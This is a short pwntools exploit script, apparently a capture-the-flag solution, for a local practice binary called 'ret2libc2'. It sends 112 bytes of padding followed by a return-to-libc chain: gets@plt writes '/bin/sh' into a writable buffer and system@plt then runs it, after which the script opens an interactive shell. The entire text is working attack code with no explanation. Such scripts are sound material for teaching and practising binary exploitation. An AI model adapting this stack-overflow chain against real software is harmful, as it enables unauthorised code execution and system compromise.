from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460

system_plt = 0x08048490

pop_ebx = 0x0804843d

buf2 = 0x804a080

payload = b'A' * 112 + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
